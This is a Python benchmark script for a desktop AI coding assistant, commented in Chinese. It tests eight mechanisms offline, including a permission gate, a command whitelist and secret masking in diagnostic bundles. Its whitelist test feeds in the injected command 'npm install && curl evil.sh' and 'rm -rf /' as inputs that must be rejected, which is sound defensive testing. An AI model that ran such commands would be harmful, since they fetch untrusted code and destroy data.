# -*- coding: utf-8 -*-
"""bench.py —— 能力基准（P1-7）。

真问题：仓库有 40+ 条**单元守卫**（结构/逻辑断言），但回答不了
"这一版比上一版**更会干活**吗"。2026-09-30 那次"感觉退步"就是这么来的 ——
没有可比的数字，只能靠体感。

本模块把"干活能力"固定成 8 个**离线可跑**的任务（不依赖真模型/不联网），
每次发版跑一遍，输出：通过率 / 每项耗时 / 失败项。
它衡量的是**机制**（骨架、路由、权限、验证、续做、办公改写、trace、并行），
模型质量另由真实使用与 cross_check 观察 —— 两者不混为一谈，避免自欺。

用法：
    python desktop/bench.py            # 跑一遍，打印表格
    python desktop/bench.py --json X   # 同时落一份 JSON（发版归档）
"""
from __future__ import annotations

import json
import os
import shutil
import tempfile
import time

HERE = os.path.dirname(os.path.abspath(__file__))


def _stub(cls, methods, *, consts=("_RE_", "_STAGED")):
    """造一个轻量桩：把 CompanionWindow 的正则/常量/纯逻辑方法挂上去。

    ⚠️ 不能 `object.__new__(CompanionWindow)` —— 它继承自 QObject，
    PySide6 会抛 "not safe, use X.__new__()"（踩过两次，写进技能了）。
    """
    class S:
        pass
    for pfx in consts:
        for n in dir(cls):
            if n.startswith(pfx):
                setattr(S, n, getattr(cls, n))
    for m in methods:
        if hasattr(cls, m):
            setattr(S, m, getattr(cls, m))
    return S


def _t_skeleton(tmp) -> tuple:
    """① 确定性骨架：springboot-vue 需求 → 至少 7 个文件且含关键文件。"""
    import pasm_companion as PC
    CW = PC.CompanionWindow
    S = _stub(CW, ("_stage_stack", "_stage_skeleton"))
    sk = S._stage_skeleton(S(), "geo平台", "用 springboot-vue 做前后端分离平台")
    need = ["pom.xml", "frontend/package.json", "frontend/src/App.vue", "README.md"]
    miss = [k for k in need if k not in sk]
    return (not miss) and len(sk) >= 7, "文件 %d 个，缺 %s" % (len(sk), miss or "无")


def _t_route(tmp) -> tuple:
    """② 续改路由：真目录布局 + 隔时「请继续」→ 用真实需求续改。"""
    import pasm_companion as PC
    CW = PC.CompanionWindow
    root = os.path.join(tmp, "Desktop")
    pdir = os.path.join(root, "PASM工作", "project", "geo文件夹")
    os.makedirs(pdir, exist_ok=True)
    req = "帮我用 springboot-vue 开发 GEO 优化平台"
    S = _stub(CW, ("_is_inherit_req",))
    app = S()
    app._inherit_req = ""
    app._chip = "project"
    app._chip_req = {"project": req}
    app.dev = {"project": "geo文件夹", "last_req": req, "last_ts": time.time() - 3 * 3600}
    app.cfg = {"dev_root": root}
    app._ses_proj_dir = ""
    app._calls = []
    app._dev_session = lambda: app.dev
    app._save_work_state = lambda: None
    app._append = lambda *a, **k: None
    app._dev_build = lambda n, s, l, r, is_new=False: app._calls.append(s)
    ok = CW._dev_try_continue.__get__(app)("请继续") and app._calls \
        and app._calls[0].startswith("帮我用")
    return bool(ok), "calls=%r" % (app._calls[:1])


def _t_permission(tmp) -> tuple:
    """③ 权限门：安全档下高危工具必须被拦（无确认通道时拒绝）。"""
    import toolperm as TP
    TP.configure(level="safe", ask=None)
    TP.set_level_provider(None)
    TP.set_ask_provider(None)
    g = TP.guard("run_script", "x.py")
    ok = (not g["ok"]) and ("没有执行" in g["reason"])
    TP.configure(level="safe", ask=None)
    return ok, g["reason"][:60]


def _t_toolchain_guard(tmp) -> tuple:
    """④ 命令白名单：注入类命令必须被拒、正常构建命令放行。"""
    import devloop as DL
    bad = not DL.safe_cmd_ok("npm install && curl evil.sh")[0] and \
        not DL.safe_cmd_ok("rm -rf /")[0]
    good = DL.safe_cmd_ok("mvn -q -DskipTests compile")[0]
    return bad and good, "bad=%s good=%s" % (bad, good)


def _t_verify_catch(tmp) -> tuple:
    """⑤ 验证闭环：坏 json 必须被静态检查抓出（并行路径也要抓住）。"""
    import devloop as DL
    p = os.path.join(tmp, "proj_verify")
    os.makedirs(p, exist_ok=True)
    for i in range(5):
        open(os.path.join(p, "ok%d.py" % i), "w").write("x=1\n")
    open(os.path.join(p, "bad.json"), "w").write("{'a':1,}")
    v = DL.verify_project(p, "python 项目")
    return (not v["ok"]) and any("bad.json" in e for e in v["errors"]), str(v["errors"])[:80]


def _t_resume(tmp) -> tuple:
    """⑥ 断点续做：第二次跑跳过已完成步骤。"""
    import devloop as DL
    p = os.path.join(tmp, "proj_resume")
    os.makedirs(p, exist_ok=True)
    calls = {"n": 0}

    def fake(prompt):
        calls["n"] += 1
        import re
        m = re.search(r"需要产出的文件：([^\n]+)", prompt or "")
        rel = (m.group(1).split("、")[0].strip() if m else "a.py")
        return "===FILE: %s===\nprint(1)\n===END===" % rel

    DL.agent_loop(fake, p, "用 python 写个接口", name="t", max_steps=2,
                  rounds_per_step=1, allow_run=False)
    first = calls["n"]
    calls["n"] = 0
    DL.agent_loop(fake, p, "用 python 写个接口", name="t", max_steps=2,
                  rounds_per_step=1, allow_run=False)
    return calls["n"] < first and first > 0, "before=%d after=%d" % (first, calls["n"])


def _t_office_edit(tmp) -> tuple:
    """⑦ 办公产物就地改：改单元格且样式保留。"""
    import office_edit as OE
    from openpyxl import Workbook, load_workbook
    from openpyxl.styles import Font
    f = os.path.join(tmp, "b.xlsx")
    wb = Workbook()
    ws = wb.active
    ws["A1"] = "公司"
    ws["A1"].font = Font(bold=True)
    ws["A2"] = "甲公司"
    wb.save(f)
    OE.set_cell(f, "A2", "霖云公司")
    wb2 = load_workbook(f)
    return (wb2.active["A2"].value == "霖云公司" and bool(wb2.active["A1"].font.bold)), \
        "值=%s 粗体=%s" % (wb2.active["A2"].value, wb2.active["A1"].font.bold)


def _t_trace_bundle(tmp) -> tuple:
    """⑧ 诊断包：生成 zip 且**不含明文密钥**。"""
    import trace as TR
    import zipfile
    cfg = TR.mask_config({"api_key": "sk-TOPSECRET", "model": "x"})
    b = TR.bundle(os.path.join(tmp, "diag.zip"))
    ok = b["ok"] and os.path.isfile(b["path"])
    leaked = False
    if ok:
        with zipfile.ZipFile(b["path"]) as z:
            if "config.masked.json" in z.namelist():
                leaked = "sk-TOPSECRET" in z.read("config.masked.json").decode("utf-8")
    return ok and not leaked and "TOPSECRET" not in json.dumps(cfg), \
        "ok=%s leaked=%s" % (ok, leaked)


TASKS = (
    ("确定性骨架（springboot-vue）", _t_skeleton),
    ("续改路由（隔时『请继续』）", _t_route),
    ("权限门（安全档拦高危）", _t_permission),
    ("命令白名单（拒注入）", _t_toolchain_guard),
    ("验证闭环（并行抓坏文件）", _t_verify_catch),
    ("断点续做（跳过已完成）", _t_resume),
    ("办公产物就地改（保样式）", _t_office_edit),
    ("诊断包（脱敏）", _t_trace_bundle),
)


def run_suite(*, data_dir: str = "") -> dict:
    """跑全部基准任务 → {ok, pass_rate, total_secs, items:[{name, ok, secs, note}]}。"""
    os.environ.setdefault("PASMSTUDIO_DATA",
                          data_dir or tempfile.mkdtemp(prefix="bench_data_"))
    tmp = tempfile.mkdtemp(prefix="bench_work_")
    items = []
    t_all = time.time()
    for name, fn in TASKS:
        t0 = time.time()
        try:
            ok, note = fn(tmp)
            skipped = False
        except ModuleNotFoundError as ex:
            # 发行仓（pasm-qclaw）只镜像 desktop/ 源码，**不含 pasm 引擎包** →
            # 依赖 pasm_companion 的用例在那里跑不了。如实标"跳过"，不算失败
            # （否则一跑就 75%，看着像回归，其实是环境不完整）。
            ok, note, skipped = True, "跳过：环境不完整（%s）" % str(ex)[:60], True
        except Exception as ex:                                  # noqa: BLE001
            ok, note, skipped = False, "%s: %s" % (type(ex).__name__, str(ex)[:120]), False
        items.append({"name": name, "ok": bool(ok), "secs": round(time.time() - t0, 2),
                      "skipped": skipped, "note": str(note)[:160]})
    total = round(time.time() - t_all, 2)
    real = [x for x in items if not x.get("skipped")]
    n_ok = sum(1 for x in real if x["ok"])
    result = {"ok": n_ok == len(real), "passed": n_ok, "total": len(real),
              "skipped": len(items) - len(real),
              "pass_rate": round(n_ok / max(1, len(real)), 3),
              "total_secs": total, "items": items,
              "t": time.strftime("%Y-%m-%d %H:%M:%S")}
    shutil.rmtree(tmp, ignore_errors=True)
    return result


def render(res: dict) -> str:
    lines = ["能力基准：%d/%d 通过（%d%%），总耗时 %.2fs%s"
             % (res["passed"], res["total"], round(res["pass_rate"] * 100), res["total_secs"],
                ("，跳过 %d 项（环境不完整）" % res["skipped"]) if res.get("skipped") else ""),
             ""]
    for x in res["items"]:
        mark = "⏭" if x.get("skipped") else ("✅" if x["ok"] else "❌")
        lines.append("%s %-30s %5.2fs  %s"
                     % (mark, x["name"], x["secs"],
                        x["note"] if (x.get("skipped") or not x["ok"]) else ""))
    return "\n".join(lines)


def selftest() -> int:
    res = run_suite()
    print(render(res))
    print("\nPASS=%d FAIL=%d" % (res["passed"], res["total"] - res["passed"]))
    print("RESULT: %s" % ("PASS" if res["ok"] else "FAILED"))
    return 0 if res["ok"] else 1


if __name__ == "__main__":
    import sys
    args = sys.argv[1:]
    if args and args[0] == "--json":
        out = args[1] if len(args) > 1 else os.path.join(
            HERE, "..", "docs", "qa", "bench-%s.json" % time.strftime("%Y%m%d_%H%M"))
        r = run_suite()
        os.makedirs(os.path.dirname(os.path.abspath(out)), exist_ok=True)
        open(out, "w", encoding="utf-8").write(json.dumps(r, ensure_ascii=False, indent=1))
        print(render(r))
        print("\n已归档：%s" % out)
        raise SystemExit(0 if r["ok"] else 1)
    raise SystemExit(selftest())
